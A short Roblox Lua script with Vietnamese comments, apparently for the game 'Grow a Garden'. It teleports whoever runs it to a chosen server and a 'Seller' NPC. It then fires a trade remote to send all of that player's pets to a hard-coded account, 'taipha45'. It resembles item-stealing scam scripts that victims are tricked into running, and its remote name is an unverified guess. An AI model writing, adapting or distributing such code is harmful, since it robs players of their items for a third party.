local TeleportService = game:GetService("TeleportService")
local PlaceId = 15862722220 -- ID của game Grow a Garden
local JobId = "7ceba9b28e748b4db160fd559a9b5400" -- JobId của server bạn gửi

TeleportService:TeleportToPlaceInstance(PlaceId, JobId, game.Players.LocalPlayer)
-- Tên người chơi nhận pet
local TARGET_PLAYER_NAME = "taipha45"

-- Đợi game và nhân vật load hoàn tất
repeat wait() until game:IsLoaded() and game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer.Character

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- 📦 Dịch chuyển đến NPC "Seller"
local function teleportToSeller()
    local seller = workspace:FindFirstChild("Seller")
    if seller and seller:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = seller.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
    else
        warn("Không tìm thấy NPC Seller hoặc HumanoidRootPart")
    end
end

-- 🐾 Gửi tất cả pet đến người chơi cụ thể
local function sendAllPetsToPlayer()
    local tradeRemote = game:GetService("ReplicatedStorage"):FindFirstChild("TradeRemote") -- Tên này có thể khác, cần kiểm tra
    if tradeRemote then
        tradeRemote:FireServer(TARGET_PLAYER_NAME, "SendAllPets")
    else
        warn("Không tìm thấy TradeRemote trong ReplicatedStorage")
    end
end

-- 🚀 Tự động thực hiện
teleportToSeller()
wait(2)
sendAllPetsToPlayer()